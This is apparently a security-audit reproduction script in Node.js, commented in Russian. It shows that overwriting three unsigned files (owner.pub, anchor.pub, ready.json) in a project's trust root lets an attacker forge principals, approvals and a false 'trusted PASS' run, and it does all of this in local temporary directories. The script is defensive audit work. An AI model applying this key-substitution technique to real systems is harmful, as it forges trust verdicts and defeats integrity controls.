// WP-08 QWEN independent audit — repro R1.
// Подмена публичных ключей корня доверия (в рамках возможностей A2: запись файлов в trust root,
// свои процессы того же SID, HTTP; БЕЗ извлечения DPAPI-ключей жертвы и без инъекции в процессы).
// Демонстрирует: три неподписанных файла (owner.pub, anchor.pub, ready.json) — единственная
// точка целостности всей доверенной цепочки; после подмены наблюдатель показывает trusted PASS,
// изготовленный ключами атакующего. WP-00 04-THREAT-MODEL.md:18 принимает этот риск явно.
// Запуск: node repro/r1-trustroot-substitution.mjs  (только временные каталоги и локальный стенд)
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { randomUUID } from 'node:crypto';
import { digest } from '../packages/core/canonical.mjs';
import { localBundle, localFixtureContract } from '../adapters/local/bundle.mjs';
import { serveLocalFixture } from '../adapters/local/server.mjs';
import { createTrustRoot, loadTrustRoot, signTrustedDocument, unwrapPrivateKey, verifyTrustedDocument } from '../packages/trust/identity.mjs';
import { signApproval } from '../packages/trust/approval.mjs';
import { commitEnvironmentRecord, signEnvironmentRecord } from '../packages/trust/environment.mjs';
import { currentUserSid } from '../packages/trust/windows-sid.mjs';
import { observeTrusted, startTrusted } from '../apps/control/trusted.mjs';

const sid = currentUserSid();
const bases = [];
const stands = [];
const tmp = prefix => { const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix)); bases.push(dir); return dir; };
const cleanup = async () => {
  for (const stand of stands) await stand.close().catch(() => {});
  for (const dir of bases) fs.rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
};
const out = { repro: 'R1', sha: '1a510a5d5929534d400dc965f58c78cf468bc270', steps: {} };

try {
  // 1. Легитимный мир жертвы: корень доверия, стенд, запись среды, карточки principal.
  const victimBase = tmp('qa-r1-victim-');
  const victim = {
    root: path.join(victimBase, 'store'),
    secretsDir: path.join(victimBase, 'secrets'),
    trustRoot: path.join(victimBase, 'trust')
  };
  const created = await createTrustRoot({ secretsDir: victim.secretsDir, trustRoot: victim.trustRoot, runDir: victim.root });
  const victimTrust = loadTrustRoot(victim.trustRoot);
  const victimOwnerKey = await unwrapPrivateKey(path.join(victim.secretsDir, 'owner.key'));
  const victimStand = await serveLocalFixture({ generation: 1 }); stands.push(victimStand);
  const victimRecord = signEnvironmentRecord(victimOwnerKey, {
    environmentId: victimStand.environmentId, generation: 1, kind: 'local-stand', status: 'active',
    origin: victimStand.baseUrl, standKeyId: victimStand.standKeyId, credentialRef: 'local:fixture-token'
  });
  commitEnvironmentRecord(victimTrust, victim.trustRoot, victimRecord);
  const victimOperator = signTrustedDocument(victimOwnerKey, {
    schemaVersion: '0.2.0', domain: 'principal', principalId: 'victim-operator',
    roles: ['operator'], keyId: created.ownerKeyId, windowsSid: sid, status: 'active'
  });
  out.steps.originalRoot = { ownerKeyId: created.ownerKeyId, anchorKeyId: created.anchorKeyId };
  out.steps.originalPrincipalVerifies = verifyTrustedDocument(victimTrust, victimOperator).principalId;

  // 2. Атакующий: собственный корень (свои ключи, своя DPAPI-обёртка — НЕ извлечение ключей жертвы).
  const attackerBase = tmp('qa-r1-attacker-');
  const attacker = {
    secretsDir: path.join(attackerBase, 'secrets'),
    trustRoot: path.join(attackerBase, 'trust')
  };
  const attackerCreated = await createTrustRoot({ secretsDir: attacker.secretsDir, trustRoot: attacker.trustRoot });
  const attackerOwnerKey = await unwrapPrivateKey(path.join(attacker.secretsDir, 'owner.key'));

  // 3. A2-действие: перезапись трёх файлов в trust root жертвы. Приватные ключи не трогаются.
  for (const name of ['owner.pub', 'anchor.pub', 'ready.json']) {
    fs.copyFileSync(path.join(attacker.trustRoot, name), path.join(victim.trustRoot, name));
  }
  const takenTrust = loadTrustRoot(victim.trustRoot);
  out.steps.substitutedRoot = { ownerKeyId: takenTrust.owner.keyId, anchorKeyId: takenTrust['anchor-signer'].keyId };
  out.steps.rootTakeover = takenTrust.owner.keyId === attackerCreated.ownerKeyId && takenTrust['anchor-signer'].keyId === attackerCreated.anchorKeyId;

  // 4. Документы жертвы больше не проходят подпись; документы атакующего — проходят.
  try { verifyTrustedDocument(takenTrust, victimOperator); out.steps.victimPrincipalRejected = false; }
  catch (error) { out.steps.victimPrincipalRejected = error.code; }
  const attackerOperator = signTrustedDocument(attackerOwnerKey, {
    schemaVersion: '0.2.0', domain: 'principal', principalId: 'attacker-operator',
    roles: ['operator'], keyId: attackerCreated.ownerKeyId, windowsSid: sid, status: 'active'
  });
  const attackerOwner = signTrustedDocument(attackerOwnerKey, {
    schemaVersion: '0.2.0', domain: 'principal', principalId: 'attacker-owner',
    roles: ['owner'], keyId: attackerCreated.ownerKeyId, windowsSid: sid, status: 'active'
  });
  out.steps.attackerPrincipalVerifies = verifyTrustedDocument(takenTrust, attackerOperator).principalId;

  // 5. Атакующий изготавливает полный доверенный прогон под корнем жертвы:
  //    свой стенд, своя запись среды, свой approval, свой anchor.key (переданный как anchorKeyPath).
  const rogueStand = await serveLocalFixture({ generation: 1 }); stands.push(rogueStand);
  const rogueRecord = signEnvironmentRecord(attackerOwnerKey, {
    environmentId: rogueStand.environmentId, generation: 1, kind: 'local-stand', status: 'active',
    origin: rogueStand.baseUrl, standKeyId: rogueStand.standKeyId, credentialRef: 'local:fixture-token'
  });
  commitEnvironmentRecord(takenTrust, victim.trustRoot, rogueRecord);
  const runId = 'r1-forged-' + randomUUID().slice(0, 8);
  const contract = localFixtureContract(rogueStand, runId);
  rogueStand.fixtureId = contract.fixtureId;
  const bundle = localBundle(rogueStand, { runId });
  bundle.fixture = contract;
  bundle.manifest.fixtureSha256 = digest(contract);
  bundle.manifest.budget.deadlineMs = 60000;
  const issuedAt = new Date().toISOString();
  const approval = signApproval(attackerOwnerKey, {
    approvalId: 'approval-' + randomUUID().slice(0, 8),
    issuerPrincipalId: 'attacker-owner', subjectPrincipalId: 'attacker-operator',
    operationId: bundle.operation.id, operationVersion: bundle.operation.version,
    scenarioContentSha256: bundle.scenario.approval.contentSha256,
    operationSha256: digest(bundle.operation), approvedInputsHash: digest(bundle.operation.inputs),
    fixtureId: contract.fixtureId, targetEnvironmentId: rogueStand.environmentId, environmentGeneration: 1,
    targetResource: { method: 'POST', path: '/records' },
    allowedEffects: bundle.operation.effects.map(effect => ({ id: effect.id, field: effect.field, equals: effect.equals })),
    issuedAt, expiresAt: new Date(Date.parse(issuedAt) + 10 * 60 * 1000).toISOString(),
    approvalNonce: 'cd'.repeat(32), keyId: attackerCreated.ownerKeyId
  }, takenTrust, victim.trustRoot);
  const result = await startTrusted(bundle, {
    root: victim.root, trustRoot: victim.trustRoot,
    approvalId: approval.approvalId, approval,
    issuer: attackerOwner, subject: attackerOperator,
    anchorKeyPath: path.join(attacker.secretsDir, 'anchor.key'),
    standPublicKey: rogueStand.standPublicKey,
    credentials: { 'local:fixture-token': rogueStand.authToken }
  });
  out.steps.forgedRun = { verdict: result.verdict.verdict, reasonCode: result.verdict.reasonCode, runId };
  const observed = await observeTrusted({ root: victim.root, trustRoot: victim.trustRoot, runId });
  out.steps.observed = { trusted: observed.trusted, passed: observed.passed, verdict: observed.verdict?.verdict ?? null, anchorId: observed.anchorId };
  out.steps.rogueStandMutations = rogueStand.mutationCount;
  out.steps.victimStandMutations = victimStand.mutationCount;

  // Итог: ложный доверенный PASS изготовлен в рамках A2 (запись файлов trust root + свои процессы).
  out.falseTrustedPass = observed.trusted === true && observed.passed === true && observed.verdict?.verdict === 'PASS';
  out.classification = 'Принимаемый остаточный риск WP-00 (04-THREAT-MODEL.md:18); в перечне остаточных рисков A1–A3 явно не перечислен. Для Dev/ЦИЗ недопустимо.';
  console.log(JSON.stringify(out, null, 2));
  process.exitCode = out.falseTrustedPass ? 0 : 1;
} catch (error) {
  out.error = { code: error.code || null, message: String(error.message || error) };
  console.log(JSON.stringify(out, null, 2));
  process.exitCode = 2;
} finally {
  await cleanup();
}